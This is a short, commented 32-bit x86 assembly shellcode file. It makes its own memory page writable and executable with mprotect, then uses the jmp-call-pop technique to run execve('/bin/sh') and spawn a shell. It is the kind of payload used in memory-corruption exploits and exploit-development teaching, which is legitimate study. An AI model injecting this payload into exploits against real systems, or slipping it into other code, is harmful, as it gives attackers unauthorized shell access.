.section .text
.globl _start
_start:
    call   unprotect
    jmp    bringoutthegimp

unprotect:
    popl   %ebx
    pushl  %ebx
    andl   $0xfffff000,%ebx #. Alignment to page (0x1000)
    mov    $0x1000,%ecx     #. Let's unprotect a page
    mov    $0x7,%edx        #. PROT_READ|PROT_WRITE|PROT_EXEC
    mov    $0x7d,%eax       #. __NR_mprotect
    int    $0x80
    ret

#. execve(shell[0], shell, NULL);
the_gimp:
    popl   %esi             #. ESI(arg4) = "/bin/sh:----____"
    xor    %eax, %eax       #. EAX = 0x00000000
    mov    %al,  0x7(%esi)  #. ESI(arg4) = "/bin/sh" (+ '\0' + "----____")
    leal   0x0(%esi), %ebx  #. EBX(arg1) = &ESI
    movl   %ebx, 0x8(%esi)  #. ESI(arg4) = "/bin/sh" (+ '\0' + &ESI + "____")
    movl   %eax, 0xc(%esi)  #. ESI(arg4) = "/bin/sh" (+ '\0' + &ESI + "\0\0\0\0")
    mov    $0x0b, %al       #. EAX = 0x0000000b (execve)
    movl   %esi, %ebx       #. EBX(arg1) = ESI = "/bin/sh"
    leal   0x8(%esi), %ecx  #. ECX(arg2) = &ESI = &"/bin/sh"
    leal   0xc(%esi), %edx  #. EDX(arg3) = NULL
    int    $0x80            #. Wake the kernel

bringoutthegimp:
    call   the_gimp
    .ascii "/bin/sh:----____"

